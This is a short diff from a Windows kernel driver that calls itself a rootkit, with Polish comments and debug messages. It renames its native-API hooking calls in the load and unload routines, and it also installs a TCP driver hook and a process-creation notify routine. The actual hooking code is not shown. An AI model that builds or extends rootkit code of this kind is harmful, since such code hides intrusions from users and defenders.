@@ -130,7 +130,7 @@ VOID OnUnload( IN PDRIVER_OBJECT DriverObject )
 	DbgPrint("rootkit: wszedlem w OnUnload: %x \n",DriverObject);
 	
 	// odhookowanie systemu
-	UnHookApis();
+	UnHookNativeApi();
 	
 	DbgPrint("rootkit: zwalniam TCP hook\n");
 	UninstallTCPDriverHook();
@@ -292,7 +292,7 @@ NTSTATUS DriverEntry( IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING theRegi
 	DbgPrint("rootkit: ustawiam TCP hook\n");
 	InstallTCPDriverHook();
 
-	HookApis();
+	HookNativeApi();
 	
 	PsSetCreateProcessNotifyRoutine( ProcessNotify , FALSE );
 
